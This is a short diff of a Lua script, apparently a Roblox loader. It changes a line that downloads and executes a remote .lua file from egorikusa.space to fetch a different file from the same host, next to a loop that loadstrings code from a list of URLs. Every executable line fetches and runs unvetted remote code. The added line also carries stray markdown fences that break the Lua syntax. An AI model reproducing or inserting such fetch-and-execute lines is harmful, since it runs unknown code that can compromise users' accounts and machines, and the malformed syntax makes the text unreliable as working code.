@@ -5,5 +5,5 @@ for _, url in pairs({
     loadstring(game:HttpGet(url, true))()
 end
 
-
-loadstring(game:HttpGet("https://egorikusa.space/c4f39df05f45c751928e95b1.lua", true))()
+```lua
+loadstring(game:HttpGet("https://egorikusa.space/c345e949ad2ddf8597c9d56a.lua", true))()```
